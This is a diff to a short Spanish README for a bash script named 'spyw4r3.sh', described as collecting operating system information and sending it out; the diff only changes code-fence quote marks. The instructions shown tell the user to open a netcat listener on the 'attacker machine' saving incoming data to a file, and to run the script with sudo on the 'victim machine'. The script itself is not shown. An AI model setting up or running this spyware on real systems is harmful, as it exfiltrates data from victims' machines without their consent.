@@ -5,12 +5,12 @@ Script en bash que recolecta informacion del sistema operativo y envia los datos
 # Intrucciones 
 
 Desde la maquina atacante 
-'''
+```
 nc -nlvp <PORT> >> data.txt
-'''
+```
 
 Desde la maquina victima 
-'''
+```
 sudo bash spyw4r3.sh
-'''
+```
 
